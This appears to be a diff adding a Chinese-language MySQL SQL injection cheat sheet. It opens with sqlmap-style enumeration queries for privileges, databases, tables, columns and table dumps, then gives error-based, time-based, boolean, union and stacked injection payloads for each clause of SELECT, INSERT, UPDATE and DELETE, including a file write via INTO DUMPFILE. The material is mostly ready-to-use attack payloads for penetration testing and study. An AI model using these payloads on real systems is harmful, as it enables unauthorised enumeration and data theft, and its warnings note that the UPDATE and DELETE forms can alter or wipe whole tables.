+                <blind query="SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s' LIMIT %d,1" query2="SELECT select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s'" count2="SELECT COUNT(*) FROM mysql.user WHERE user='%s'"/>
+            </privileges>
+            <roles/>
+            <statements>
+                <inband query="SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST" query2="SELECT INFO FROM DATA_DICTIONARY.PROCESSLIST"/>
+                <blind query="SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST ORDER BY ID LIMIT %d,1" query2="SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE ID=%d" query3="SELECT ID FROM INFORMATION_SCHEMA.PROCESSLIST LIMIT %d,1" count="SELECT COUNT(DISTINCT(INFO)) FROM INFORMATION_SCHEMA.PROCESSLIST"/>
+            </statements>
+            <dbs>
+                <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA" query2="SELECT db FROM mysql.db"/>
+                <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1" query2="SELECT DISTINCT(db) FROM mysql.db LIMIT %d,1" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db"/>
+            </dbs>
+            <tables>
+                <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES" query2="SELECT database_name,table_name FROM mysql.innodb_table_stats" condition="table_schema" condition2="database_name"/>
+                <blind query="SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' LIMIT %d,1" query2="SELECT table_name FROM mysql.innodb_table_stats WHERE database_name='%s' LIMIT %d,1" count="SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" count2="SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name='%s'"/>
+            </tables>
+            <columns>
+                <inband query="SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
+                <blind query="SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" query2="SELECT column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND column_name='%s' AND table_schema='%s'" count="SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
+            </columns>
+            <dump_table>
+                <inband query="SELECT %s FROM %s.%s ORDER BY %s"/>
+                <blind query="SELECT %s FROM %s.%s ORDER BY %s LIMIT %d,1" count="SELECT COUNT(*) FROM %s.%s"/>
+            </dump_table>
+            <search_db>
+                <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT db FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
+                <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT DISTINCT(db) FROM mysql.db WHERE %s" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
+            </search_db>
+            <search_table>
+                <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES WHERE %s" condition="table_name" condition2="table_schema"/>
+                <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.TABLES WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.TABLES WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" condition="table_name" condition2="table_schema"/>
+            </search_table>
+            <search_column>
+                <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" condition="column_name" condition2="table_schema" condition3="table_name"/>
+                <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" condition="column_name" condition2="table_schema" condition3="table_name"/>
+            </search_column>
+        </dbms>
+
+## 注入案例
+
+### SELECT statement
+
+[select语句官方文档](https://dev.mysql.com/doc/refman/5.7/en/select.html)
+
+    
+    
+    SELECT
+        [ALL | DISTINCT | DISTINCTROW ]
+        [HIGH_PRIORITY]
+        [STRAIGHT_JOIN]
+        [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
+        [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
+        select_expr [, select_expr] ...
+        [into_option]
+        [FROM table_references
+          [PARTITION partition_list]]
+        [WHERE where_condition]
+        [GROUP BY {col_name | expr | position}
+          [ASC | DESC], ... [WITH ROLLUP]]
+        [HAVING where_condition]
+        [ORDER BY {col_name | expr | position}
+          [ASC | DESC], ...]
+        [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+        [PROCEDURE procedure_name(argument_list)]
+        [into_option]
+        [FOR UPDATE | LOCK IN SHARE MODE]
+    
+    into_option: {
+        INTO OUTFILE 'file_name'
+            [CHARACTER SET charset_name]
+            export_options
+      | INTO DUMPFILE 'file_name'
+      | INTO var_name [, var_name] ...
+    }
+
+#### LIMIT clause
+
+[参考链接](https://www.jianshu.com/p/6c1420a7a7d9)  
+`PROCEDURE ANALYSE()`从 MySQL 5.7.18 开始弃用，并在 MySQL 8.0 中删除。
+
+    
+    
+    # error
+    select table_name FROM information_schema.tables limit 0,1 procedure analyse(100, extractvalue(1,concat(0x2a,pi())))
+    
+    # time
+    select table_name FROM information_schema.tables limit 0,1 procedure analyse(10, extractvalue(1,concat(0x2a,(if(1,benchmark(pow(10,8),md5(0)),1)))))
+    
+    # 写文件 有对应权限
+    select table_name FROM information_schema.tables limit 0,1 into dumpfile 'file_name'
+    
+    # stack 支持多语句
+    select table_name FROM information_schema.tables limit 0,1;select!sleep(5)
+    
+    # union 不能有order by子句
+    select table_name FROM information_schema.tables limit 0,1 union select pi()
+
+#### ORDER clause
+
+    
+    
+    # error
+    select table_name FROM information_schema.tables order by 1 asc, extractvalue(1,concat(0x2a,pi()))
+    
+    # time
+    select table_name FROM information_schema.tables order by 1 desc, if(0,1,sleep(5))
+    
+    # bool
+    select table_name FROM information_schema.tables order by 1 asc, if(0,1,2)
+    select table_name FROM information_schema.tables order by 1 asc, if(1,1,2)
+    
+    # stack
+    select table_name FROM information_schema.tables order by 1 asc;select!sleep(5)#
+
+#### GROUP clause
+
+    
+    
+    # error
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc, extractvalue(1,concat(0x2a,pi()))
+    
+    # time
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME desc, if(0,1,sleep(5))
+    
+    # bool
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME desc, if(0,1,2)
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc, if(1,1,2)
+    
+    # stack
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc;select!sleep(5)#
+    
+    # union
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc union select 1,pi()
+
+#### HAVING clause
+
+    
+    
+    # error
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03'|extractvalue(1,concat(0x2a,pi()))|''
+    
+    # time
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03'|sleep(5)|''
+    
+    # bool
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03'xor'a'='a'
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03'xor'b'='a'
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03'and'a'='a'
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03'and'b'='a'
+    
+    # stack
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03';select!sleep(5)#
+    
+    # union
+    select CREATE_TIME,count(*) FROM information_schema.tables group by CREATE_TIME asc having CREATE_TIME > '2020-02-03' union select 1,pi()
+
+#### WHERE clause
+
+    
+    
+    # error
+    select * FROM information_schema.tables where table_name='columns'|extractvalue(1,concat(0x2a,pi()))|''
+    
+    # time
+    select * FROM information_schema.tables where table_name='columns'|sleep(5)|''
+    
+    # bool
+    select * FROM information_schema.tables where table_name='columns'xor'a'='a'
+    select * FROM information_schema.tables where table_name='columns'xor'b'='a'
+    select * FROM information_schema.tables where table_name='columns'or'a'='a'
+    select * FROM information_schema.tables where table_name='columns'or'b'='a'
+    select * FROM information_schema.tables where table_name='columns'and'a'='a'
+    select * FROM information_schema.tables where table_name='columns'and'b'='a'
+    
+    # union
+    select TABLE_NAME FROM information_schema.tables where table_name='columns' union select 1#
+    
+    # stack
+    select TABLE_NAME FROM information_schema.tables where table_name='columns';select!sleep(5)#
+
+#### FROM clause
+
+    
+    
+    # error
+    select TABLE_NAME FROM (select!extractvalue(1,concat(0x2a,pi())))t
+    
+    # time
+    select TABLE_NAME FROM (select!sleep(5))t
+    
+    # bool
+    select * FROM information_schema.tables where 1#
+    select * FROM information_schema.tables where 0#
+    
+    # union
+    select TABLE_NAME FROM information_schema.tables union select pi()#
+    select TABLE_NAME FROM information_schema.tables union select pi()#
+    
+    # stack
+    select TABLE_NAME FROM information_schema.tables;select!sleep(5)#
+
+#### SELECT clause
+
+    
+    
+    # error
+    select ALL extractvalue(1,concat(0x2a,pi())), TABLE_NAME, TABLE_TYPE FROM information_schema.tables
+    
+    # time
+    select ALL sleep(5), TABLE_NAME, TABLE_TYPE FROM information_schema.tables
+    
+    # bool
+    select ALL if(1,1,TABLE_NAME), TABLE_TYPE FROM information_schema.tables
+    select ALL if(0,1,TABLE_NAME), TABLE_TYPE FROM information_schema.tables
+    
+    # union
+    查询出当前语句后，构造union查询
+    
+    # stack
+    查询出当前语句后，构造stack查询
+
+### INSERT | REPLACE statement
+
+[insert语句官方文档](https://dev.mysql.com/doc/refman/5.7/en/insert.html)
+
+    
+    
+    INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
+        [INTO] tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        [(col_name [, col_name] ...)]
+        {VALUES | VALUE} (value_list) [, (value_list)] ...
+        [ON DUPLICATE KEY UPDATE assignment_list]
+    
+    INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
+        [INTO] tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        SET assignment_list
+        [ON DUPLICATE KEY UPDATE assignment_list]
+    
+    INSERT [LOW_PRIORITY | HIGH_PRIORITY] [IGNORE]
+        [INTO] tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        [(col_name [, col_name] ...)]
+        SELECT ...
+        [ON DUPLICATE KEY UPDATE assignment_list]
+    
+    value:
+        {expr | DEFAULT}
+    
+    value_list:
+        value [, value] ...
+    
+    assignment:
+        col_name = value
+    
+    assignment_list:
+        assignment [, assignment] ...
+
+insert语句示例
+
+    
+    
+    INSERT INTO user VALUES(1,'admin','123456')
+    INSERT INTO user (name,password) VALUES('admin','123456')
+    INSERT INTO user VALUES(1,'admin','123456')
+    INSERT INTO user SET id=1,name='admin'
+    INSERT INTO user (name,password) SELECT name,password from user2
+
+[replace语句官方文档](https://dev.mysql.com/doc/refman/5.7/en/replace.html)  
+REPLACE工作方式与INSERT完全相同，但如果表中的旧行与 PRIMARY KEY 或UNIQUE 索引的新行具有相同的值，则在插入新行之前删除旧行。
+
+    
+    
+    REPLACE [LOW_PRIORITY | DELAYED]
+        [INTO] tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        [(col_name [, col_name] ...)]
+        {VALUES | VALUE} (value_list) [, (value_list)] ...
+    
+    REPLACE [LOW_PRIORITY | DELAYED]
+        [INTO] tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        SET assignment_list
+    
+    REPLACE [LOW_PRIORITY | DELAYED]
+        [INTO] tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        [(col_name [, col_name] ...)]
+        SELECT ...
+    
+    value:
+        {expr | DEFAULT}
+    
+    value_list:
+        value [, value] ...
+    
+    assignment:
+        col_name = value
+    
+    assignment_list:
+        assignment [, assignment] ...
+
+#### VALUES clause
+
+    
+    
+    # error
+    INSERT INTO user (name,password) VALUES('admin'|extractvalue(1,concat(0x2a,pi()))|'','123456')
+    
+    # time
+    INSERT INTO user (name,password) VALUES('admin'|sleep(5)|'','123456')
+
+### UPDATE statement
+
+[update语句官方文档](https://dev.mysql.com/doc/refman/5.7/en/update.html)
+
+单表语法
+
+    
+    
+    UPDATE [LOW_PRIORITY] [IGNORE] table_reference
+        SET assignment_list
+        [WHERE where_condition]
+        [ORDER BY ...]
+        [LIMIT row_count]
+    
+    value:
+        {expr | DEFAULT}
+    
+    assignment:
+        col_name = value
+    
+    assignment_list:
+        assignment [, assignment] ...
+
+多表语法
+
+    
+    
+    UPDATE [LOW_PRIORITY] [IGNORE] table_references
+        SET assignment_list
+        [WHERE where_condition]
+
+#### SET clause
+
+    
+    
+    # error
+    UPDATE user SET name='admin'|extractvalue(1,concat(0x2a,pi()))|'',password='123456' WHERE id=1
+    
+    # time
+    UPDATE user SET name='admin'|sleep(5)|'',password='123456' WHERE id=1
+
+#### WHERE clause
+
+    
+    
+    慎重，容易修改全部数据，条件建议永远为false
+    # error
+    UPDATE user SET name='admin',password='123456' WHERE id=1&&extractvalue(1,concat(0x2a,pi()))
+    
+    # time
+    UPDATE user SET name='admin',password='123456' WHERE id=1&&sleep(5)
+
+#### ORDER clause
+
+    
+    
+    # error
+    UPDATE user SET name='admin1',password='123456' WHERE id=1 order by name asc,extractvalue(1,concat(0x2a,pi()))
+
+#### LIMIT clause
+
+指定影响到行数
+
+    
+    
+    # stack
+    UPDATE user SET name='admin123',password='123456' limit 0;select!sleep(5)
+
+### DELETE statement
+
+[delete语句官方文档](https://dev.mysql.com/doc/refman/5.7/en/delete.html)  
+单表语法
+
+    
+    
+    DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name
+        [PARTITION (partition_name [, partition_name] ...)]
+        [WHERE where_condition]
+        [ORDER BY ...]
+        [LIMIT row_count]
+
+多表语法
+
+    
+    
+    DELETE [LOW_PRIORITY] [QUICK] [IGNORE]
+        tbl_name[.*] [, tbl_name[.*]] ...
+        FROM table_references
+        [WHERE where_condition]
+    
+    DELETE [LOW_PRIORITY] [QUICK] [IGNORE]
+        FROM tbl_name[.*] [, tbl_name[.*]] ...
+        USING table_references
+        [WHERE where_condition]
+
+#### WHERE clause
+
+    
+    
+    慎重，容易删除全部数据，条件建议永远为false
+    # error
+    delete from user where id=1&&extractvalue(1,concat(0x2a,pi()))
+    
+    # time
+    UPDATE user SET name='admin',password='123456' WHERE id=1&&sleep(5)
+
+#### ORDER clause
+
+    
+    
+    # error
+    UPDATE user SET name='admin321',password='123456' WHERE id=1 order by name asc,extractvalue(1,concat(0x2a,pi()))
+
